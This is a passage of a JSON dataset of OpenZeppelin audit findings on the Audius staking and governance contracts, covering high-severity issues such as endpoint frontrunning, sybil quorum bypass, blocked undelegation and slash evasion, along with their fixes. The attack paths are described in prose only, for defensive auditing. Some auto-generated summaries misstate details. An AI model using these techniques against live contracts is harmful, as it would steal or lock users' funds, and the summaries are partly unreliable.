      "summary": "\nThis bug report is about the Audius Protocol, which is a decentralized music streaming platform. The bug is that if a service provider becomes unresponsive (e.g., by losing their keys, dying, etc.), the service provider will not call the `claimRewards` function. After one week, the `_claimPending` function will always return `true`, preventing delegators from undelegating their stake. \n\nThe solution proposed is to refactor the `claimRewards` function to allow anyone to call it, passing in a service provider address as a parameter. This way, the rewards-claiming process can be moved forward by anyone, not just the service provider, protecting delegators from an unresponsive service provider. This bug has since been fixed in pull request #556.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11322",
      "title": "[H11] A service provider can prevent their delegators from undelegating their stake",
      "impact": "HIGH",
      "content": "A service provider can prevent their delegators from undelegating their stake. This may happen maliciously or unintentionally, as follows.\n\n\nSuppose a service provider has registered one or more endpoints and has staked the minimum amount of required stake. Then suppose one or more delegators have collectively staked an additional `X` tokens for this service provider, where `X <= spDetails[_sp].minAccountStake - minDeployerStake`, so that `totalStakedFor(_sp) = spDetails[_sp].minAccountStake + X`.\n\n\nNext, consider what happens if the service provider decreases its stake by `X`:\n\n\nThe service provider’s call to the [`requestDecreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364) will succeed, because the call to the [`_validateBalanceInternal` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L773) will not revert (all three `require` statements will be satisfied).\n\n\nTheir subsequent call to the [`decreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364) will succeed for the same reason.\n\n\nAt this point, `totalStakedFor(_sp) = spDetails[_sp].minAccountStake`. This means that any attempt by a delegator to undelegate a positive number of tokens via the [`undelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L239) will revert [on line 311](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L311), because [the first `require` statement](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L776) in the `_validateBalanceInternal` function will not be satisfied.\n\n\nConsider requiring that `spDetails[_sp].deployerStake >= spDetails[_sp].minAccountStake` when validating balances. This would put the burden of maintaining the `minAccountStake` on the service provider, thus removing this vulnerability.\n\n\n***Update**: Partially fixed in [pull request #577](https://github.com/AudiusProject/audius-protocol/pull/577). Now the minimum stake for a service provider must come from the service provider itself instead of using the delegators’ stake. Nevertheless, if governance decides to slash a service provider and its staked balance ends up between `0 < SPBalance < spDetails[_sp].minAccountStake`, the delegators for that service provider will not be able to undelegate their stake. That way, the malicious service provider could stake only `spDetails[_sp].minAccountStake`, handle a bigger delegated stake value, and perform a malicious action that will be slashed to prevent delegators from undelegating when [the new requirement](https://github.com/AudiusProject/audius-protocol/blob/mainnet-audit-feedback/eth-contracts/contracts/ServiceProviderFactory.sol#L907) reverts.*\n\n\n***Update**: Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657). The `undelegateStake` function no longer calls the `validateAccountStakeBalance` function.*",
      "summary": "\nThis bug report is about a vulnerability in the Audius Protocol in which a service provider can maliciously or unintentionally prevent their delegators from undelegating their stake. This is done by the service provider decreasing their stake by an amount that is equal to or less than the minimum amount of stake required for the service provider. This would result in the total stake for the service provider being equal to the minimum account stake, making it impossible for the delegators to undelegate their stake.\n\nTo fix this vulnerability, it was proposed that the minimum stake for a service provider must come from the service provider itself instead of using the delegators’ stake. However, this would not prevent malicious service providers from staking only the minimum account stake and then performing a malicious action that would be slashed, preventing the delegators from undelegating.\n\nThe vulnerability was partially fixed in pull request #577, and then fully fixed in pull request #657. The `undelegateStake` function was modified so that it no longer calls the `validateAccountStakeBalance` function. This ensures that delegators can undelegate their stake, even if the service provider’s stake is slashed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11321",
      "title": "[H10] A service provider can deceive its delegators",
      "impact": "HIGH",
      "content": "Service providers can earn AUD tokens by allowing delegators to delegate their stake into its account. The [`deployerCut` value](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L28) establishes the percentage of the rewards that the service provider collects from the delegators’ rewards after each round.\n\n\nA service provider can modify the `deployerCut` variable by calling the [`updateServiceProviderCut` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L546-L559) at any time. It is also possible for them to even set it as 100, which would mean that delegators will not get rewards after the funding round has been completed.\n\n\nIf a service provider makes use of this function just before executing the [`claimRewards` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L327) from the `DelegateManager` contract, delegators will receive fewer or no rewards from that round, contrary to what they initially expected.\n\n\nConsider requiring that a change to the `deployerCut` variable undergoes a timelock for a period of time greater than the [`fundingRoundBlockDiff` value](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L28). This would allow delegators to have enough time to move their stake to another service provider.\n\n\n***Update**: Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657). Adjusting the `deployerCut` value now requires waiting for a timelock.*",
      "summary": "\nThis bug report is about the `deployerCut` variable in the Audius Protocol. The `deployerCut` value establishes the percentage of rewards that the service provider collects from the delegators’ rewards after each round. Service providers can modify the `deployerCut` variable by calling the `updateServiceProviderCut` function at any time. This means that if a service provider updates the `deployerCut` variable just before executing the `claimRewards` function from the `DelegateManager` contract, delegators may receive fewer or no rewards from that round. \n\nTo prevent this, the bug report suggests requiring that a change to the `deployerCut` variable undergoes a timelock for a period of time greater than the `fundingRoundBlockDiff` value. This would give delegators enough time to move their stake to another service provider. The bug has since been fixed in pull request #657, where adjusting the `deployerCut` value now requires waiting for a timelock.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11320",
      "title": "[H09] Slash process can be bypassed",
      "impact": "HIGH",
      "content": "There are two ways for any address to be slashed. The first one is by a governance’s proposal, and the second one is by a transaction performed by the guardian.\n\n\nFor governance to decide to slash a service provider, a proposal must be submitted to the contract, stakers must vote on it and achieve a majority, and then it has to be executed. This process takes several blocks to complete.\n\n\n[The `votingPeriod`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L23) establishes how long a governance proposal is open for voting.\n\n\nSimilarly, the [`decreaseStakeLockupDuration` variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L17) establishes the minimum length of time a service provider must wait before removing their stake.\n\n\nIf `decreaseStakeLockupDuration` is less than or equal to the `votingPeriod`, it will be possible for a malicious service provider to remove their stake before it can be slashed by the Governance protocol.\n\n\nSince the guardian is expected to be removed once the system is fully operational — meaning that slashing a malicious service provider using the guardian account will not be possible — consider setting the `decreaseStakeLockupDuration` so it is much greater than the `votingPeriod`. This would ensure that a malicious service provider can always be slashed via governance.\n\n\n***Update**: Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657). The `_updateDecreaseStakeLockupDuration` function enforces that the `decreaseStakeLockupDuration` value is greater than the voting period plus an execution delay.*",
      "summary": "\nThe bug report is about the Audius Protocol, which is a decentralized music streaming platform. The report states that there are two ways for any address to be slashed: by a governance proposal or by a transaction performed by the guardian. The `votingPeriod` establishes how long a governance proposal is open for voting, while the `decreaseStakeLockupDuration` establishes the minimum length of time a service provider must wait before removing their stake. \n\nThe bug report states that if `decreaseStakeLockupDuration` is less than or equal to the `votingPeriod`, it will be possible for a malicious service provider to remove their stake before it can be slashed by the Governance protocol. It recommends setting the `decreaseStakeLockupDuration` so it is much greater than the `votingPeriod` to ensure that a malicious service provider can always be slashed via governance.\n\nThe bug has been fixed in pull request #657. The `_updateDecreaseStakeLockupDuration` function enforces that the `decreaseStakeLockupDuration` value is greater than the voting period plus an execution delay.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11319",
      "title": "[H08] Endpoint registration can be frontrun",
      "impact": "HIGH",
      "content": "An honest service provider’s call to the [`ServiceProviderFactory.register` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L141) can be frontrun by a malicious actor in order to prevent any honest user from being able to register any endpoint.\n\n\nThe attacker can monitor the mempool for any calls to the `register` function, then frontrun them with their own call to the `register` function using the same `_endpoint` parameter.\n\n\nThis registers the endpoint under the attacker’s account so that the honest user’s attempt to register their endpoint will fail [on line 163](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L163).\n\n\nThere is a cost to this attack. In particular, the attacker must stake the [`minStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L26) or else [line 199](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L199) will revert. This stake may be at risk of being slashed until the attacker has deregistered the endpoint and removed their stake. Since it takes at least ten blocks for an attacker to remove their stake after deregistering an endpoint, there is a window of opportunity for governance to slash the attacker. However, given the nature of the attack, it is not clear that it could be detected and punished within the ten blocks (about 2.5 minutes) lockup duration.\n\n\nIf `minStake` is small enough and/or the probability of getting detected and slashed is low enough, then this attack would have a low expected cost. Since these are currently unknowns, it is conservative to classify this issue as high severity.\n\n\nTo prevent a malicious service provider to register another service provider’s endpoint first, consider hashing the endpoint and the service provider’s address (`msg.sender`) together to create the endpoint’s `bytes32` identifier and then use it in a commit/reveal scheme during the registration process.\n\n\n***Update**: Fixed in [pull request # 573](https://github.com/AudiusProject/audius-protocol/pull/573/files), where the lockup period was changed from 10 blocks to 1 week. While the registration process may still be frontrun, there will be enough time for such behavior to be detected and punished via slashing.*",
      "summary": "\nThis bug report is about a malicious actor frontrunning an honest service provider’s call to the `ServiceProviderFactory.register` function. The attacker can monitor the mempool for calls to the `register` function, then frontrun them with their own call using the same `_endpoint` parameter. This registers the endpoint under the attacker’s account so that the honest user’s attempt to register their endpoint will fail. The attacker must stake the `minStake` or else the call will revert. This stake may be at risk of being slashed until the attacker has deregistered the endpoint and removed their stake. The severity of this issue is classified as high due to the unknowns of the cost of the attack and the probability of it being detected and punished. To prevent this attack, a commit/reveal scheme should be used during the registration process. The issue was fixed in pull request # 573, where the lockup period was changed from 10 blocks to 1 week.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11318",
      "title": "[H07] The quorum requirement can be trivially bypassed with sybil accounts",
      "impact": "HIGH",
      "content": "While the final vote on a proposal is determined via a token-weighted vote, [the quorum check](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L366) in the `evaluateProposalOutcome` function can be trivially bypassed by splitting one’s tokens over multiple accounts and voting with each of the accounts. Each of these sybil votes [increases the `proposals[_proposalId].numVotes` variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L281). This means anyone can make the quorum check pass.\n\n\nConsider measuring quorum size by the percentage of existing tokens that have voted, rather than the number of unique accounts that have voted.\n\n\n***Update:** Fixed in [pull request #574](https://github.com/AudiusProject/audius-protocol/pull/574). However, note that the [`setVotingQuorumPercent` function](https://github.com/AudiusProject/audius-protocol/pull/574/files#diff-cdd717eae25ddcfc7ccd2b9bd6be68c1R466) is not validating that the value set is between 0 and 100.*",
      "summary": "\nA bug was reported in the Audius Protocol which allowed users to bypass the quorum check in the `evaluateProposalOutcome` function. This was done by splitting one’s tokens over multiple accounts and voting with each of the accounts. This would increase the `proposals[_proposalId].numVotes` variable and make the quorum check pass. To address this, the bug report suggested that quorum size should be measured by the percentage of existing tokens that have voted, rather than the number of unique accounts that have voted. The bug has been fixed in pull request #574, however, the `setVotingQuorumPercent` function is not validating that the value set is between 0 and 100.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11317",
      "title": "[H06] AUD lending market could affect the protocol",
      "impact": "HIGH",
      "content": "In case an AUD token lending market appears, an attacker could use this market to influence the result of a governance’s proposal, which could lead to a take over of the protocol.\n\n\nAn attacker would only need to stake tokens for a brief moment without waiting for the [`votingPeriod`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L23) to request an unstake. This aggravates the attack, as the attacker would only need to take a loan for the number of blocks established by the [`decreaseStakeLockupDuration` variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L17).\n\n\nThe only prerequisite that an attacker needs for this attack is to have sufficient collateral, which could be trivial if a lending market of AUD tokens exists while AUD price is still low enough.\n\n\nConsider countermeasures for these type of attacks, and have plan for how to react when a lending market for AUD is created.\n\n\n***Update**: Fixed. As described in the updates of “[H08] Endpoint registration can be frontrun” and “[H09] Slash process can be bypassed”, `decreaseStakeLockupDuration` is already significantly larger than `votingPeriod` + `executionDelay`. Audius’s statement about this issue:*\n\n\n\n> The above is no longer possible with our enforced relationship between decreaseStakeLockup and votingPeriod + delay. An attacker may still stake tokens immediately prior to a proposal, but the relationship between the two variables means they are still subject to a slash operation. This is because an attacker cannot unstake without waiting at at least one votingPeriod + executionDelay time difference.\n> \n>",
      "summary": "\nThis bug report is about the potential of an attacker to influence the result of a governance proposal if an AUD token lending market appears. Such an attack would require the attacker to stake tokens for a brief moment without waiting for the voting period to request an unstake. The only prerequisite for such an attack is having sufficient collateral, which could be easy if the AUD price is low. To counter this attack, Audius has enforced a relationship between the decreaseStakeLockupDuration variable and the votingPeriod + executionDelay, meaning that an attacker cannot unstake without waiting at least one votingPeriod + executionDelay time difference. This effectively makes the attack impossible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11316",
      "title": "[H05] Rewards calculation is incorrect when the service provider has a pending “decrease stake” request",
      "impact": "HIGH",
      "content": "When the service provider has no [`DecreaseStakeRequest`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L36) pending, the [`claimRewards` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L327) from the `DelegateManager` contract seems to work as intended. But when the service provider has a `DecreaseStakeRequest` pending, the `claimRewards` function computes the [`totalRewards` value](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L352) incorrectly (setting it too high). In particular, the `claimRewards` function sets the value of the `totalRewards` variable equal to the total amount of rewards that are being paid out *plus* the amount of any `DecreaseStakeRequest` the service provider has pending.\n\n\nThis makes the [`ServiceProviderFactory`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol) and the [`DelegateManager`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol) contracts record incorrect (too high) values for the [`spDetails[_serviceProvider].deployerStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L27) and [`delegateInfo[delegator][_serviceProvider]`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L61), respectively. As a result, the staking contract may become insolvent, owing more tokens than it holds.\n\n\nTo see that the [`DelegateManager.claimRewards()` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L327) computes `totalRewards` incorrectly, first consider [this code block](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L338-L342). The `totalRewards` variable is computed using these variables, so we begin here.\n\n\nLooking at the [`_validateClaimRewards` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L705), one can see that it first [processes the claim](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L714), which mints into existence any rewards due, and stakes them for the service provider.\n\n\nThen, the `_totalBalanceInStaking`, `_totalBalanceInSPFactory`, and `_totalBalanceOutsideStaking` variables are computed as follows:\n\n\nThe [`_totalBalanceInStaking` variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L720) gets set to `Staking(stakingAddress).totalStakedFor(_serviceProvider)`, which, in this context, is equal to:\n\n\n`_totalBalanceInStaking =  \n\nthe amount of locked SP stake from before claimRewards was called  \n\n+ the amount of unlocked SP stake from before claimRewards was called  \n\n+ the amount of delegator stake from before claimRewards was called  \n\n+ any rewards just paid out by ClaimsManager.processClaim`\n\n\nNext, [`_totalBalanceInSPFactory` is initially set](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L724) to the total amount of stake (locked + unlocked) that the service provider has staked. Then [on line 727](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L727) it is updated by subtracting away the amount of the service provider’s locked stake. So `_totalBalanceInSPFactory` ends up being:\n\n\n`_totalBalanceInSPFactory =  \n\nthe amount of unlocked SP stake from before claimRewards was called`\n\n\nFinally, `_totalBalanceOutsideStaking` [gets set to](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L733) `_totalBalanceInSPFactory.add(spDelegateInfo[_serviceProvider].totalDelegatedStake)`. So we have:\n\n\n`_totalBalanceOutsideStaking =  \n\nthe amount of unlocked SP stake from before claimRewards was called  \n\n+ the amount of delegator stake from before claimRewards was called`\n\n\nThe [`totalRewards` variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L352) is computed as `totalBalanceInStaking.sub(totalBalanceOutsideStaking)`, which, by substituting the above values and simplifying, is equal to:\n\n\n`totalRewards =  \n\nthe amount of locked SP stake from before claimRewards was called  \n\n+ any rewards just paid out by ClaimsManager.processClaim`\n\n\nSo if the service provider has any locked stake, then `totalRewards` will not accurately represent the amount of rewards that were paid out during [the call to `processClaim`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L714).\n\n\nConsider adjusting the [`processClaim` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L227) so that it directly returns the amount of rewards that it paid out. Then the `totalRewards` variable can be set directly equal to the `processClaim` function’s return value instead of being computed indirectly. This has the additional benefit of reducing gas costs.\n\n\n***Update**: Fixed in [pull request #562](https://github.com/AudiusProject/audius-protocol/pull/562). The Audius team noticed that, although there are two incorrect balance calculations when a stake decrease is pending, these two errors cancel each other out. The final comparison between what was minted and the internal record is correct. Consequently, we downgraded the severity of this issue to high. Now the `processClaim` function from the `ClaimManager` contract returns the minted rewards for the service provider directly. Note that the calculation is still complex and could be refactored for clarity. Audius’ statement for this issue:*\n\n\n\n> Summary: During rewards calculation, a pending decrease stake request results in a value for totalRewards that is incorrect – by the amount of requested decrease in stake. Further analysis into the issue exposed an even more interesting behavior, confirming that value for totalRewards is incorrect but also showing that the final value set for a claimer in ServiceProviderFactory is not higher than expected. This is because our base value for the new Service Provider stake is also skewed but in the opposite direction during calculation of the new Service Provider stake.\n> \n> \n> For this reason we would like to consider re-classifying the issue from Critical to High – rewards are neither minted incorrectly nor distributed incorrectly, but tracked incorrectly during the process of claiming.\n> \n> \n> Interestingly enough, we already have a test case to cover reward distribution when a decrease stake request is pending. However this was passing due to the described condition above.\n> \n>",
      "summary": "\nA bug has been identified in the `DelegateManager` and `ServiceProviderFactory` contracts, which are part of the Audius protocol. When a service provider has a `DecreaseStakeRequest` pending, the `claimRewards` function from the `DelegateManager` contract computes the totalRewards value incorrectly, setting it too high. This results in the `ServiceProviderFactory` and `DelegateManager` contracts recording incorrect (too high) values for the `spDetails[_serviceProvider].deployerStake` and `delegateInfo[delegator][_serviceProvider]` variables, respectively. This could lead to the staking contract becoming insolvent, owing more tokens than it holds.\n\nThe issue was caused by how the `totalRewards` variable was computed. It was set equal to the total amount of rewards that were being paid out, plus the amount of any `DecreaseStakeRequest` the service provider had pending. This was done by first setting the `_totalBalanceInStaking` variable to the total amount of stake (locked + unlocked) that the service provider has staked, and then subtracting away the amount of the service provider’s locked stake. This resulted in the `totalRewards` variable being set to the amount of locked SP stake from before claimRewards was called, plus any rewards just paid out by ClaimsManager.processClaim.\n\nThe Audius team fixed the issue by adjusting the `processClaim` function so that it directly returns the amount of rewards that it paid out. This allowed the `totalRewards` variable to be set directly equal to the `processClaim` function’s return value instead of being computed indirectly. This also had the additional benefit of reducing gas costs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11315",
      "title": "[H04] No incentive for evaluating proposals with outcome other than Yes",
      "impact": "HIGH",
      "content": "After a voting period has ended, the [`evaluateProposalOutcome` function of the `Governance` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L316) can be called to try to execute the target contract for proposals with a Yes quorum and to update the proposal state.\n\n\nThere is an incentive for approved proposals to be executed by their proposers or supporters. However, when a proposal does not reach the quorum (or is rejected), this function spends gas to update the state. It is unclear why a user would pay for this gas to clean up the proposals state. Since anybody can submit a proposal at any time, this could lead to many closed proposals with an outdated `InProgress` state. This could be confusing to voting interfaces which will have to inspect the proposal to check if they are actually open.\n\n\nConsider adding an incentive for the caller of the `evaluateProposalOutcome` function, so there are better guarantees that the state of the proposals will be up-to-date.\n\n\n***Update:** Fixed in pull requests [#575](https://github.com/AudiusProject/audius-protocol/pull/575) and [#609](https://github.com/AudiusProject/audius-protocol/pull/609). Now, before submitting a new proposal, the status of all the proposals that can be evaluated have to be up-to-date. Note that this could make it too expensive for somebody to send new proposals if they have to evaluate many old proposals. In this case, again, only the administrators might be incentivized to evaluate all the proposals in order to unblock the system. Also note that [setting the maximum number of in-progress proposals](https://github.com/AudiusProject/audius-protocol/blob/f38eed25e094144a98886c06546c3f885a009e31/eth-contracts/contracts/Governance.sol#L589) emits no event.*",
      "summary": "\nThis bug report is about the `evaluateProposalOutcome` function of the `Governance` contract. This function is used to execute the target contract for proposals with a Yes quorum and to update the proposal state. However, when a proposal does not reach the quorum or is rejected, this function spends gas to update the state, which does not have any incentive for the caller. This could lead to many closed proposals with an outdated `InProgress` state, which could be confusing to voting interfaces. Therefore, it is suggested to add an incentive for the caller of the `evaluateProposalOutcome` function, so there are better guarantees that the state of the proposals will be up-to-date. \n\nThis bug was fixed in pull requests [#575](https://github.com/AudiusProject/audius-protocol/pull/575) and [#609](https://github.com/AudiusProject/audius-protocol/pull/609). Now, before submitting a new proposal, the status of all the proposals that can be evaluated have to be up-to-date. This could make it too expensive for somebody to send new proposals if they have to evaluate many old proposals. In this case, again, only the administrators might be incentivized to evaluate all the proposals in order to unblock the system. Additionally, [setting the maximum number of in-progress proposals](https://github.com/AudiusProject/audius-protocol/blob/f38eed25e094144a98886c06546c3f885a009e31/eth-contracts/contracts/Governance.sol#L589) emits no event.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11314",
      "title": "[H03] Updating the Governance registry and Guardian addresses emits no events",
      "impact": "HIGH",
      "content": "In the `Governance` contract the [`registryAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L17) and the [`guardianAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L32) are highly sensitive accounts. The first one holds the contracts that can be proposal targets, and the second one is a superuser account that can execute proposals without voting.\n\n\nThese variables can be updated by calling [`setRegistryAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L477) and [`transferGuardianship`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L543), respectively. Note that these two functions update these sensitive addresses without logging any events. Stakers who monitor the Audius system would have to inspect all transactions to notice that one address they trust is replaced with an untrusted one.\n\n\nConsider emitting events when these addresses are updated. This will be more transparent, and it will make it easier for clients to subscribe to the events when they want to keep track of the status of the system.\n\n\n***Update**: Fixed in [pull request #563](https://github.com/AudiusProject/audius-protocol/pull/563/files).*",
      "summary": "\nThis bug report is about the `Governance` contract in the Audius Protocol. This contract holds two highly sensitive accounts, the `registryAddress` and the `guardianAddress`. These variables can be updated by calling `setRegistryAddress` and `transferGuardianship`, respectively. However, these functions do not log any events when the addresses are updated, making it difficult for stakers to monitor the Audius system.\n\nThe solution proposed in the bug report is to emit events when these addresses are updated. This will make the system more transparent and easier for clients to keep track of the status of the system. The bug report has been fixed in pull request #563.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11313",
      "title": "[H02] Delegators can prevent service providers from deregistering endpoints",
      "impact": "HIGH",
